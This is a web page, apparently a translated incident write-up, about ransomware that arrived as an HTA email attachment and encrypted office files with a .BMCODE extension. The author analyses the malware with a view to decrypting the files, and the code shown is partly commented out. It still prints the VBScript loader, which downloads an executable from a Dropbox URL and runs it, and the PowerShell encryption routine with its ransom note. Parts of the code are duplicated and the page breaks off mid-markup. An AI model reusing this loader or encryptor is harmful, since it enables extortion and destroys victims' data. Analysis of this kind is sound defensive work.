<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>PowerShell. Decrypt files after exposure to "virus"</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In a certain city of Russia 
 (It may be that even in yours) 
 There is not a small firm. 
 Rent a room 
 At NIimorgorvorproma. 
 This company has an ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>PowerShell. Decrypt files after exposure to "virus"</h1><div class="post__text post__text-html js-mediator-article"><blockquote>  In a certain city of Russia <br>  (It may be that even in yours) <br>  There is not a small firm. <br>  Rent a room <br>  At NIimorgorvorproma. </blockquote><br>  This company has an employee who likes to read mail.  It opens somehow a file, someone invested on purpose, into the depths of the letter that came.  Having launched ‚ÄúThank-you letter.hta‚Äù without a second thought and not seeing congratulations, I decided to smoke a little.  Returning from a smoke break, he reads in anxiety: <br><br><blockquote>  If you are reading this message, then your computer has been attacked by a dangerous virus. <br>  All your information (documents, movies and other files) on this computer was encrypted <br>  using the most cryptographic algorithm in the world of RSA1024. <br>  You can restore files only with the help of a special program.  To get it, you need <br>  write us an email to unblockme@tormail.org <br><a name="habracut"></a><br>  Attempting to decrypt without our program files may be damaged! <br>  Attach a file to the letter, which is located on the desktop "READ_ME_NOW !!!!!!. TXT", or this file <br>  Threats will only threaten you and your files!  DO NOT FORGET: only WE can decrypt your files! <br><br>  pz8FkWJXdijcajJcWfhJ27TGPgcNNEKEKDBcsdyzfX and lUoq68eAptVmGNIYLD8eti1kwicdOR59pwOC7XM7T + YLccqyeJqc5loxMCKy4pklzbMJBRM and 4ckjzbMJT + YLccqyeJqc5loxMCKy4pklzbMJBRM and 4ckjjcMjt + YLccqyeJqc5loxMCKy4pklzbMJTRMpYWF7XM7T + YLccqyeJqc5loxMCKy4pklzbMJBRMpYWF7XMDT </blockquote>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Now the same thing in other words.  The employee received a letter with the attachment ‚ÄúThank-you letter.rar‚Äù. The body of the letter indicated that the archive was password-protected and a password was given.  It just so happened that these days customers sent such letters and the employee did not suspect anything.  Open the archive and launch the attachment ‚ÄúThank you letter.hta‚Äù.  After a while, almost all files acquired the .BMCODE extension (added to the end, without deleting the text of the original extension) and in each folder lay READ_ME_NOW !!!!!! txt with the above text.  The user said "where it is necessary" and they took up the "who should." <br>  First of all, without a panic, we looked at this * .hta and saw: <br>  <i><b>The original code here and hereinafter is slightly modified and commented out so that there are no random launches.</b></i> <br><div class="spoiler">  <b class="spoiler_title">Hta code</b> <div class="spoiler_text"><pre><code class="php hljs">&lt;!--     base64--&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=<span class="hljs-string"><span class="hljs-string">"windows-1251"</span></span>&gt; &lt;/head&gt; &lt;HTA:APPLICATION ID=<span class="hljs-string"><span class="hljs-string">"objHTA_Info"</span></span> APPLICATIONNAME=<span class="hljs-string"><span class="hljs-string">"HTA_Info"</span></span> SINGLEINSTANCE=<span class="hljs-string"><span class="hljs-string">"yes"</span></span> &gt; &lt;body&gt; &lt;script language=VBScript&gt; <span class="hljs-string"><span class="hljs-string">'Execute base64decode("      base64 ") Function base64decode(data) a="CDO.Message" set b=CreateObject(a) With b.BodyPart .ContentTransferEncoding = "base64" .Charset = "windows-1251" With .GetEncodedContentStream .WriteText data .Flush End With With .GetDecodedContentStream .Charset = "utf-8" base64decode = .ReadText End With End With End Function &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;</span></span></code> </pre> </div></div><br><br>  We look further (the department began to get hysteric from laughter how everything is genius and simple): <br><br><div class="spoiler">  <b class="spoiler_title">Execute base64decode (</b> <div class="spoiler_text"><pre> <code class="hljs pgsql">a1686979793=<span class="hljs-number"><span class="hljs-number">1686979793</span></span>: Const SYSTEM32 = &amp;H25:<span class="hljs-keyword"><span class="hljs-keyword">Set</span></span> # fso = CreateObject("Scripting.FileSystemObject"): <span class="hljs-keyword"><span class="hljs-keyword">Set</span></span> objShell = CreateObject("Shell.Application"): <span class="hljs-keyword"><span class="hljs-keyword">Set</span></span> wshShell = CreateObject( "WScript.Shell" ): #<span class="hljs-keyword"><span class="hljs-keyword">Set</span></span> objFolder = objShell.Namespace(SYSTEM32): <span class="hljs-keyword"><span class="hljs-keyword">Set</span></span> objFolderItem = objFolder.Self: filepath = replace(objHTA_Info.commandLine,chr(<span class="hljs-number"><span class="hljs-number">34</span></span>),""): arguments = " -command $path=((get-content -Path '" + filepath + "' -totalcount 1) -split '%'[1]; #$bytes = [System.Convert]::FromBase64String($path); $decoded = [System.Text.Encoding]::UTF8.GetString($bytes); Invoke-Expression $decoded": <span class="hljs-type"><span class="hljs-type">Path</span></span> = objFolderItem.Path + "\WindowsPowerShell\v1.0\powershell.exe": newPath = <span class="hljs-type"><span class="hljs-type">Path</span></span> &amp; arguments:RarPath = wshShell.ExpandEnvironmentStrings("%TMP%") &amp; "\powershell.exe": TestPath = wshShell.ExpandEnvironmentStrings("%TMP%") &amp; "\powershell\powershell.exe":. appNewPath = wshShell.ExpandEnvironmentStrings("%TMP%") &amp; "\powershell\powershell.exe" &amp; arguments: <span class="hljs-keyword"><span class="hljs-keyword">If</span></span> (fso.FileExists(<span class="hljs-type"><span class="hljs-type">Path</span></span>)) <span class="hljs-keyword"><span class="hljs-keyword">Then</span></span>: wshShell.Run newPath, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">False</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">Else</span></span> : #<span class="hljs-keyword"><span class="hljs-keyword">If</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Not</span></span> (fso.FileExists(TestPath)) <span class="hljs-keyword"><span class="hljs-keyword">Then</span></span>: dim xHttp: <span class="hljs-keyword"><span class="hljs-keyword">Set</span></span> xHttp = createobject("Microsoft.XMLHTTP"): dim bStrm: <span class="hljs-keyword"><span class="hljs-keyword">Set</span></span> bStrm = createobject("Adodb.Stream"): xHttp.<span class="hljs-keyword"><span class="hljs-keyword">Open</span></span> "GET", "https://dl.dropbox.com/sh/wn8x35r9l9wsitn/XSwafOFh9E/powershell.exe?dl=1", <span class="hljs-keyword"><span class="hljs-keyword">False</span></span>: xHttp.Send: <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> bStrm: .<span class="hljs-keyword"><span class="hljs-keyword">type</span></span> = <span class="hljs-number"><span class="hljs-number">1</span></span>: .<span class="hljs-keyword"><span class="hljs-keyword">open</span></span>: #.<span class="hljs-keyword"><span class="hljs-keyword">write</span></span> xHttp.responseBody: .savetofile RarPath, <span class="hljs-number"><span class="hljs-number">2</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">with</span></span>: wshShell.Run RarPath, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">End</span></span> <span class="hljs-keyword"><span class="hljs-keyword">If</span></span> : wshShell.Run appNewPath, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> : <span class="hljs-keyword"><span class="hljs-keyword">End</span></span> <span class="hljs-keyword"><span class="hljs-keyword">If</span></span></code> </pre><br></div></div><br>  Having roughly understood that the main thing is that PowerShell is being downloaded from its account on dropbox.com and we are losing interest in this piece. <br>  Further: <br><br><div class="spoiler">  <b class="spoiler_title">the first piece in base64</b> <div class="spoiler_text"><pre> <code class="hljs smalltalk"><span class="hljs-string"><span class="hljs-string">$1</span></span>686979793=<span class="hljs-number"><span class="hljs-number">1686979793</span></span>; <span class="hljs-string"><span class="hljs-string">$E</span></span>rrorActionPreference=<span class="hljs-comment"><span class="hljs-comment">"SilentlyContinue"</span></span>; if(((<span class="hljs-type"><span class="hljs-type">Get</span></span>-<span class="hljs-type"><span class="hljs-type">Process</span></span> -<span class="hljs-type"><span class="hljs-type">Name</span></span> powershell).count) -ge <span class="hljs-number"><span class="hljs-number">2</span></span>){exit}<span class="hljs-string"><span class="hljs-string">$r</span></span>ef=[<span class="hljs-type"><span class="hljs-type">Reflection</span></span>.<span class="hljs-type"><span class="hljs-type">Assembly</span></span>]::<span class="hljs-type"><span class="hljs-type">LoadWithPartialName</span></span>(<span class="hljs-string"><span class="hljs-string">'System.Security'</span></span>); <span class="hljs-type"><span class="hljs-type">Add</span></span>-<span class="hljs-type"><span class="hljs-type">Type</span></span> -<span class="hljs-type"><span class="hljs-type">Assembly</span></span> <span class="hljs-type"><span class="hljs-type">System</span></span>.<span class="hljs-type"><span class="hljs-type">Web</span></span>; <span class="hljs-string"><span class="hljs-string">$e</span></span>k=(get-wmiobject <span class="hljs-type"><span class="hljs-type">Win32_ComputerSystemProduct</span></span>).<span class="hljs-type"><span class="hljs-type">UUID</span></span>; [byte[]]<span class="hljs-string"><span class="hljs-string">$b</span></span>ytes=[system.<span class="hljs-type"><span class="hljs-type">Text</span></span>.<span class="hljs-type"><span class="hljs-type">Encoding</span></span>]::<span class="hljs-type"><span class="hljs-type">Unicode</span></span>.<span class="hljs-type"><span class="hljs-type">GetBytes</span></span>(<span class="hljs-string"><span class="hljs-string">$e</span></span>k); <span class="hljs-string"><span class="hljs-string">$b</span></span>asekey=<span class="hljs-comment"><span class="hljs-comment">"BgIAAACkAABSU0ExAAQAAAEAAQDTYUZyVxhh48R/1Y/H5NdEgi49DIHtJTXm+mcVHnvUpYiNEnxpFj/UJXVDg0F2rfWFpnyqHJ0dbyjsOCwMX0eRyp2VxrWFzOHIM6QpevxGF9izXeNq7+OzBuo11V/7EmvQBW2sfuNEOP7zdUw0DFKoK+X2Taewaki1LGYhpshjqg=="</span></span>; #<span class="hljs-string"><span class="hljs-string">$r</span></span>sa = <span class="hljs-type"><span class="hljs-type">New</span></span>-<span class="hljs-type"><span class="hljs-type">Object</span></span> <span class="hljs-type"><span class="hljs-type">System</span></span>.<span class="hljs-type"><span class="hljs-type">Security</span></span>.<span class="hljs-type"><span class="hljs-type">Cryptography</span></span>.<span class="hljs-type"><span class="hljs-type">RSACryptoServiceProvider</span></span>; #<span class="hljs-string"><span class="hljs-string">$r</span></span>sa.<span class="hljs-type"><span class="hljs-type">ImportCspBlob</span></span>([system.<span class="hljs-type"><span class="hljs-type">Convert</span></span>]::<span class="hljs-type"><span class="hljs-type">FromBase64String</span></span>(<span class="hljs-string"><span class="hljs-string">$b</span></span>asekey)); <span class="hljs-string"><span class="hljs-string">$e</span></span>nckey=[system.<span class="hljs-type"><span class="hljs-type">Convert</span></span>]::<span class="hljs-type"><span class="hljs-type">ToBase64String</span></span>(<span class="hljs-string"><span class="hljs-string">$r</span></span>sa.<span class="hljs-type"><span class="hljs-type">Encrypt</span></span>(<span class="hljs-string"><span class="hljs-string">$b</span></span>ytes, <span class="hljs-string"><span class="hljs-string">$f</span></span>alse)); <span class="hljs-string"><span class="hljs-string">$t</span></span>ext= <span class="hljs-comment"><span class="hljs-comment">"    ,       .`r`n   (,    )     `r`n       RSA1024.`r`n       .   ,  `r`n     unblockme@tormail.org`r`n        !`r`n   ,      `"</span></span><span class="hljs-type"><span class="hljs-type">READ_ME_NOW</span></span>!!!!!!.<span class="hljs-type"><span class="hljs-type">TXT</span></span>`<span class="hljs-comment"><span class="hljs-comment">",   `r`n         !  :      !`r`n`r`n"</span></span> + <span class="hljs-string"><span class="hljs-string">$e</span></span>nckey; <span class="hljs-symbol"><span class="hljs-symbol">#function</span></span> <span class="hljs-type"><span class="hljs-type">Encrypt</span></span>-<span class="hljs-type"><span class="hljs-type">File</span></span>(<span class="hljs-string"><span class="hljs-string">$i</span></span>tem, <span class="hljs-string"><span class="hljs-string">$P</span></span>assphrase){ <span class="hljs-string"><span class="hljs-string">$s</span></span>alt=<span class="hljs-comment"><span class="hljs-comment">"BMCODE hack your system"</span></span>; <span class="hljs-string"><span class="hljs-string">$i</span></span>nit=<span class="hljs-comment"><span class="hljs-comment">"BMCODE INIT"</span></span>; <span class="hljs-string"><span class="hljs-string">$r</span></span> = new-<span class="hljs-type"><span class="hljs-type">Object</span></span> <span class="hljs-type"><span class="hljs-type">System</span></span>.<span class="hljs-type"><span class="hljs-type">Security</span></span>.<span class="hljs-type"><span class="hljs-type">Cryptography</span></span>.<span class="hljs-type"><span class="hljs-type">RijndaelManaged</span></span>; <span class="hljs-string"><span class="hljs-string">$p</span></span>ass = [<span class="hljs-type"><span class="hljs-type">Text</span></span>.<span class="hljs-type"><span class="hljs-type">Encoding</span></span>]::<span class="hljs-type"><span class="hljs-type">UTF8</span></span>.<span class="hljs-type"><span class="hljs-type">GetBytes</span></span>(<span class="hljs-string"><span class="hljs-string">$P</span></span>assphrase); <span class="hljs-string"><span class="hljs-string">$s</span></span>alt = [<span class="hljs-type"><span class="hljs-type">Text</span></span>.<span class="hljs-type"><span class="hljs-type">Encoding</span></span>]::<span class="hljs-type"><span class="hljs-type">UTF8</span></span>.<span class="hljs-type"><span class="hljs-type">GetBytes</span></span>(<span class="hljs-string"><span class="hljs-string">$s</span></span>alt); <span class="hljs-string"><span class="hljs-string">$r</span></span>.<span class="hljs-type"><span class="hljs-type">Key</span></span> = (new-<span class="hljs-type"><span class="hljs-type">Object</span></span> <span class="hljs-type"><span class="hljs-type">Security</span></span>.<span class="hljs-type"><span class="hljs-type">Cryptography</span></span>.<span class="hljs-type"><span class="hljs-type">PasswordDeriveBytes</span></span> <span class="hljs-string"><span class="hljs-string">$p</span></span>ass, <span class="hljs-string"><span class="hljs-string">$s</span></span>alt, <span class="hljs-comment"><span class="hljs-comment">"SHA1"</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>).<span class="hljs-type"><span class="hljs-type">GetBytes</span></span>(<span class="hljs-number"><span class="hljs-number">32</span></span>); <span class="hljs-string"><span class="hljs-string">$r</span></span>.<span class="hljs-type"><span class="hljs-type">IV</span></span> = (new-<span class="hljs-type"><span class="hljs-type">Object</span></span> <span class="hljs-type"><span class="hljs-type">Security</span></span>.<span class="hljs-type"><span class="hljs-type">Cryptography</span></span>.<span class="hljs-type"><span class="hljs-type">SHA1Managed</span></span>).<span class="hljs-type"><span class="hljs-type">ComputeHash</span></span>( [<span class="hljs-type"><span class="hljs-type">Text</span></span>.<span class="hljs-type"><span class="hljs-type">Encoding</span></span>]::<span class="hljs-type"><span class="hljs-type">UTF8</span></span>.<span class="hljs-type"><span class="hljs-type">GetBytes</span></span>(<span class="hljs-string"><span class="hljs-string">$i</span></span>nit) )[<span class="hljs-number"><span class="hljs-number">0.</span></span><span class="hljs-number"><span class="hljs-number">.15</span></span>]; <span class="hljs-string"><span class="hljs-string">$r</span></span>.<span class="hljs-type"><span class="hljs-type">Padding</span></span>=<span class="hljs-comment"><span class="hljs-comment">"Zeros"</span></span>; <span class="hljs-string"><span class="hljs-string">$r</span></span>.<span class="hljs-type"><span class="hljs-type">Mode</span></span>=<span class="hljs-comment"><span class="hljs-comment">"CBC"</span></span>; <span class="hljs-string"><span class="hljs-string">$c</span></span> = <span class="hljs-string"><span class="hljs-string">$r</span></span>.<span class="hljs-type"><span class="hljs-type">CreateEncryptor</span></span>(); <span class="hljs-string"><span class="hljs-string">$m</span></span>s = new-<span class="hljs-type"><span class="hljs-type">Object</span></span> <span class="hljs-type"><span class="hljs-type">IO</span></span>.<span class="hljs-type"><span class="hljs-type">MemoryStream</span></span>; <span class="hljs-string"><span class="hljs-string">$c</span></span>s = new-<span class="hljs-type"><span class="hljs-type">Object</span></span> <span class="hljs-type"><span class="hljs-type">Security</span></span>.<span class="hljs-type"><span class="hljs-type">Cryptography</span></span>.<span class="hljs-type"><span class="hljs-type">CryptoStream</span></span> <span class="hljs-string"><span class="hljs-string">$m</span></span>s,<span class="hljs-string"><span class="hljs-string">$c</span></span>,<span class="hljs-comment"><span class="hljs-comment">"Write"</span></span>; <span class="hljs-string"><span class="hljs-string">$c</span></span>s.<span class="hljs-type"><span class="hljs-type">Write</span></span>(<span class="hljs-string"><span class="hljs-string">$i</span></span>tem, <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-string"><span class="hljs-string">$i</span></span>tem.<span class="hljs-type"><span class="hljs-type">Length</span></span>); <span class="hljs-string"><span class="hljs-string">$c</span></span>s.<span class="hljs-type"><span class="hljs-type">Close</span></span>(); <span class="hljs-string"><span class="hljs-string">$m</span></span>s.<span class="hljs-type"><span class="hljs-type">Close</span></span>(); <span class="hljs-string"><span class="hljs-string">$r</span></span>.<span class="hljs-type"><span class="hljs-type">Clear</span></span>(); return <span class="hljs-string"><span class="hljs-string">$m</span></span>s.<span class="hljs-type"><span class="hljs-type">ToArray</span></span>(); } #<span class="hljs-string"><span class="hljs-string">$d</span></span>isks=<span class="hljs-type"><span class="hljs-type">Get</span></span>-<span class="hljs-type"><span class="hljs-type">PSDrive</span></span>|<span class="hljs-type"><span class="hljs-type">Where</span></span>-<span class="hljs-type"><span class="hljs-type">Object</span></span> {<span class="hljs-string"><span class="hljs-string">$_</span></span>.<span class="hljs-type"><span class="hljs-type">Free</span></span> -gt <span class="hljs-number"><span class="hljs-number">50000</span></span>}|<span class="hljs-type"><span class="hljs-type">Sort</span></span>-<span class="hljs-type"><span class="hljs-type">Object</span></span> -<span class="hljs-type"><span class="hljs-type">Descending</span></span>; foreach(<span class="hljs-string"><span class="hljs-string">$d</span></span>isk in <span class="hljs-string"><span class="hljs-string">$d</span></span>isks){gci <span class="hljs-string"><span class="hljs-string">$d</span></span>isk.root -<span class="hljs-type"><span class="hljs-type">Recurse</span></span> -<span class="hljs-type"><span class="hljs-type">Include</span></span> <span class="hljs-comment"><span class="hljs-comment">"*.doc"</span></span>,  ,<span class="hljs-comment"><span class="hljs-comment">"*.1cd"</span></span> |%{try {<span class="hljs-string"><span class="hljs-string">$f</span></span>ile=[io.file]::<span class="hljs-type"><span class="hljs-type">Open</span></span>(<span class="hljs-string"><span class="hljs-string">$_</span></span>, <span class="hljs-type"><span class="hljs-type">Open</span></span><span class="hljs-string"><span class="hljs-string">', '</span></span><span class="hljs-type"><span class="hljs-type">ReadWrite</span></span><span class="hljs-string"><span class="hljs-string">'); #if ($file.Length -lt "40960"){$size=$file.Length}else{$size="40960"} [byte[]]$buff = new-object byte[] $size; $ToEncrypt = $file.Read($buff, 0, $buff.Length); $file.Position='</span></span><span class="hljs-number"><span class="hljs-number">0</span></span><span class="hljs-string"><span class="hljs-string">'; #$Encrypted=Enckrypt-File $buff $ek; $file.Write($Encrypted, 0, $Encrypted.Length); $file.Close(); #$newname=$_.Name+'</span></span>.<span class="hljs-type"><span class="hljs-type">BMCODE</span></span><span class="hljs-string"><span class="hljs-string">'; #ren -Path $_.FulName -NewName $nename -Force; $path=$_.DirectoryName+'</span></span>\<span class="hljs-type"><span class="hljs-type">READ_ME_NOW</span></span>!!!!!!.<span class="hljs-type"><span class="hljs-type">TXT</span></span><span class="hljs-string"><span class="hljs-string">'; if(!(Test-Path $path)){sc -pat $path -va $text} } catch{} } }</span></span></code> H5NdEgi49DIHtJTXm + mcVHnvUpYiNEnxpFj / UJXVDg0F2rfWFpnyqHJ0dbyjsOCwMX0eRyp2VxrWFzOHIM6QpevxGF9izXeNq7 + OzBuo11V / 7EmvQBW2sfuNEOP7zdUw0DFKoK + X2Taewaki1LGYhpshjqg =="; <code class="hljs smalltalk"><span class="hljs-string"><span class="hljs-string">$1</span></span>686979793=<span class="hljs-number"><span class="hljs-number">1686979793</span></span>; <span class="hljs-string"><span class="hljs-string">$E</span></span>rrorActionPreference=<span class="hljs-comment"><span class="hljs-comment">"SilentlyContinue"</span></span>; if(((<span class="hljs-type"><span class="hljs-type">Get</span></span>-<span class="hljs-type"><span class="hljs-type">Process</span></span> -<span class="hljs-type"><span class="hljs-type">Name</span></span> powershell).count) -ge <span class="hljs-number"><span class="hljs-number">2</span></span>){exit}<span class="hljs-string"><span class="hljs-string">$r</span></span>ef=[<span class="hljs-type"><span class="hljs-type">Reflection</span></span>.<span class="hljs-type"><span class="hljs-type">Assembly</span></span>]::<span class="hljs-type"><span class="hljs-type">LoadWithPartialName</span></span>(<span class="hljs-string"><span class="hljs-string">'System.Security'</span></span>); <span class="hljs-type"><span class="hljs-type">Add</span></span>-<span class="hljs-type"><span class="hljs-type">Type</span></span> -<span class="hljs-type"><span class="hljs-type">Assembly</span></span> <span class="hljs-type"><span class="hljs-type">System</span></span>.<span class="hljs-type"><span class="hljs-type">Web</span></span>; <span class="hljs-string"><span class="hljs-string">$e</span></span>k=(get-wmiobject <span class="hljs-type"><span class="hljs-type">Win32_ComputerSystemProduct</span></span>).<span class="hljs-type"><span class="hljs-type">UUID</span></span>; [byte[]]<span class="hljs-string"><span class="hljs-string">$b</span></span>ytes=[system.<span class="hljs-type"><span class="hljs-type">Text</span></span>.<span class="hljs-type"><span class="hljs-type">Encoding</span></span>]::<span class="hljs-type"><span class="hljs-type">Unicode</span></span>.<span class="hljs-type"><span class="hljs-type">GetBytes</span></span>(<span class="hljs-string"><span class="hljs-string">$e</span></span>k); <span class="hljs-string"><span class="hljs-string">$b</span></span>asekey=<span class="hljs-comment"><span class="hljs-comment">"BgIAAACkAABSU0ExAAQAAAEAAQDTYUZyVxhh48R/1Y/H5NdEgi49DIHtJTXm+mcVHnvUpYiNEnxpFj/UJXVDg0F2rfWFpnyqHJ0dbyjsOCwMX0eRyp2VxrWFzOHIM6QpevxGF9izXeNq7+OzBuo11V/7EmvQBW2sfuNEOP7zdUw0DFKoK+X2Taewaki1LGYhpshjqg=="</span></span>; #<span class="hljs-string"><span class="hljs-string">$r</span></span>sa = <span class="hljs-type"><span class="hljs-type">New</span></span>-<span class="hljs-type"><span class="hljs-type">Object</span></span> <span class="hljs-type"><span class="hljs-type">System</span></span>.<span class="hljs-type"><span class="hljs-type">Security</span></span>.<span class="hljs-type"><span class="hljs-type">Cryptography</span></span>.<span class="hljs-type"><span class="hljs-type">RSACryptoServiceProvider</span></span>; #<span class="hljs-string"><span class="hljs-string">$r</span></span>sa.<span class="hljs-type"><span class="hljs-type">ImportCspBlob</span></span>([system.<span class="hljs-type"><span class="hljs-type">Convert</span></span>]::<span class="hljs-type"><span class="hljs-type">FromBase64String</span></span>(<span class="hljs-string"><span class="hljs-string">$b</span></span>asekey)); <span class="hljs-string"><span class="hljs-string">$e</span></span>nckey=[system.<span class="hljs-type"><span class="hljs-type">Convert</span></span>]::<span class="hljs-type"><span class="hljs-type">ToBase64String</span></span>(<span class="hljs-string"><span class="hljs-string">$r</span></span>sa.<span class="hljs-type"><span class="hljs-type">Encrypt</span></span>(<span class="hljs-string"><span class="hljs-string">$b</span></span>ytes, <span class="hljs-string"><span class="hljs-string">$f</span></span>alse)); <span class="hljs-string"><span class="hljs-string">$t</span></span>ext= <span class="hljs-comment"><span class="hljs-comment">"    ,       .`r`n   (,    )     `r`n       RSA1024.`r`n       .   ,  `r`n     unblockme@tormail.org`r`n        !`r`n   ,      `"</span></span><span class="hljs-type"><span class="hljs-type">READ_ME_NOW</span></span>!!!!!!.<span class="hljs-type"><span class="hljs-type">TXT</span></span>`<span class="hljs-comment"><span class="hljs-comment">",   `r`n         !  :      !`r`n`r`n"</span></span> + <span class="hljs-string"><span class="hljs-string">$e</span></span>nckey; <span class="hljs-symbol"><span class="hljs-symbol">#function</span></span> <span class="hljs-type"><span class="hljs-type">Encrypt</span></span>-<span class="hljs-type"><span class="hljs-type">File</span></span>(<span class="hljs-string"><span class="hljs-string">$i</span></span>tem, <span class="hljs-string"><span class="hljs-string">$P</span></span>assphrase){ <span class="hljs-string"><span class="hljs-string">$s</span></span>alt=<span class="hljs-comment"><span class="hljs-comment">"BMCODE hack your system"</span></span>; <span class="hljs-string"><span class="hljs-string">$i</span></span>nit=<span class="hljs-comment"><span class="hljs-comment">"BMCODE INIT"</span></span>; <span class="hljs-string"><span class="hljs-string">$r</span></span> = new-<span class="hljs-type"><span class="hljs-type">Object</span></span> <span class="hljs-type"><span class="hljs-type">System</span></span>.<span class="hljs-type"><span class="hljs-type">Security</span></span>.<span class="hljs-type"><span class="hljs-type">Cryptography</span></span>.<span class="hljs-type"><span class="hljs-type">RijndaelManaged</span></span>; <span class="hljs-string"><span class="hljs-string">$p</span></span>ass = [<span class="hljs-type"><span class="hljs-type">Text</span></span>.<span class="hljs-type"><span class="hljs-type">Encoding</span></span>]::<span class="hljs-type"><span class="hljs-type">UTF8</span></span>.<span class="hljs-type"><span class="hljs-type">GetBytes</span></span>(<span class="hljs-string"><span class="hljs-string">$P</span></span>assphrase); <span class="hljs-string"><span class="hljs-string">$s</span></span>alt = [<span class="hljs-type"><span class="hljs-type">Text</span></span>.<span class="hljs-type"><span class="hljs-type">Encoding</span></span>]::<span class="hljs-type"><span class="hljs-type">UTF8</span></span>.<span class="hljs-type"><span class="hljs-type">GetBytes</span></span>(<span class="hljs-string"><span class="hljs-string">$s</span></span>alt); <span class="hljs-string"><span class="hljs-string">$r</span></span>.<span class="hljs-type"><span class="hljs-type">Key</span></span> = (new-<span class="hljs-type"><span class="hljs-type">Object</span></span> <span class="hljs-type"><span class="hljs-type">Security</span></span>.<span class="hljs-type"><span class="hljs-type">Cryptography</span></span>.<span class="hljs-type"><span class="hljs-type">PasswordDeriveBytes</span></span> <span class="hljs-string"><span class="hljs-string">$p</span></span>ass, <span class="hljs-string"><span class="hljs-string">$s</span></span>alt, <span class="hljs-comment"><span class="hljs-comment">"SHA1"</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>).<span class="hljs-type"><span class="hljs-type">GetBytes</span></span>(<span class="hljs-number"><span class="hljs-number">32</span></span>); <span class="hljs-string"><span class="hljs-string">$r</span></span>.<span class="hljs-type"><span class="hljs-type">IV</span></span> = (new-<span class="hljs-type"><span class="hljs-type">Object</span></span> <span class="hljs-type"><span class="hljs-type">Security</span></span>.<span class="hljs-type"><span class="hljs-type">Cryptography</span></span>.<span class="hljs-type"><span class="hljs-type">SHA1Managed</span></span>).<span class="hljs-type"><span class="hljs-type">ComputeHash</span></span>( [<span class="hljs-type"><span class="hljs-type">Text</span></span>.<span class="hljs-type"><span class="hljs-type">Encoding</span></span>]::<span class="hljs-type"><span class="hljs-type">UTF8</span></span>.<span class="hljs-type"><span class="hljs-type">GetBytes</span></span>(<span class="hljs-string"><span class="hljs-string">$i</span></span>nit) )[<span class="hljs-number"><span class="hljs-number">0.</span></span><span class="hljs-number"><span class="hljs-number">.15</span></span>]; <span class="hljs-string"><span class="hljs-string">$r</span></span>.<span class="hljs-type"><span class="hljs-type">Padding</span></span>=<span class="hljs-comment"><span class="hljs-comment">"Zeros"</span></span>; <span class="hljs-string"><span class="hljs-string">$r</span></span>.<span class="hljs-type"><span class="hljs-type">Mode</span></span>=<span class="hljs-comment"><span class="hljs-comment">"CBC"</span></span>; <span class="hljs-string"><span class="hljs-string">$c</span></span> = <span class="hljs-string"><span class="hljs-string">$r</span></span>.<span class="hljs-type"><span class="hljs-type">CreateEncryptor</span></span>(); <span class="hljs-string"><span class="hljs-string">$m</span></span>s = new-<span class="hljs-type"><span class="hljs-type">Object</span></span> <span class="hljs-type"><span class="hljs-type">IO</span></span>.<span class="hljs-type"><span class="hljs-type">MemoryStream</span></span>; <span class="hljs-string"><span class="hljs-string">$c</span></span>s = new-<span class="hljs-type"><span class="hljs-type">Object</span></span> <span class="hljs-type"><span class="hljs-type">Security</span></span>.<span class="hljs-type"><span class="hljs-type">Cryptography</span></span>.<span class="hljs-type"><span class="hljs-type">CryptoStream</span></span> <span class="hljs-string"><span class="hljs-string">$m</span></span>s,<span class="hljs-string"><span class="hljs-string">$c</span></span>,<span class="hljs-comment"><span class="hljs-comment">"Write"</span></span>; <span 